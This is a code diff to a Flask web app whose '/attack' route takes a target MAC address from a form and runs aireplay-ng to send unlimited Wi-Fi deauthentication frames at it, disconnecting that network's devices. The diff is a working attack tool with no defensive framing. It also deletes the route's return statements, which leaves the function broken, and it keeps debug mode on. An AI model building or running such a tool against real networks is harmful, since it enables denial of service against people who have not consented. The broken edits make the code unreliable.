@@ -25,10 +25,11 @@ def status():
 
 @app.route('/attack', methods=['GET', 'POST'])
 def attack():
-    if request.method == 'POST':
-        target_mac = request.form.get('mac')
-        interface = 'wlan0'  # Replace 'wlan0' with your wireless adapter name
+    # Deauthentication attack logic
+    interface = 'wlan0'  # Replace 'wlan0' with your wireless adapter name
+    target_mac = request.form.get('target_mac', '')  # Get the target MAC address from the form input
 
+    if request.method == 'POST' and target_mac:
         # Execute the deauthentication attack command
         command = ['aireplay-ng', '--deauth', '0', '-a', target_mac, interface]
 
@@ -39,12 +40,6 @@ def attack():
             output = e.output
             result = "Failed to execute deauthentication attack"
 
-        return render_template('attack.html', result=result, output=output)
-
-    return render_template('attack.html')
-
-if __name__ == '__main__':
-    app.run(debug=True)
 
 if __name__ == '__main__':
     app.run(debug=True)
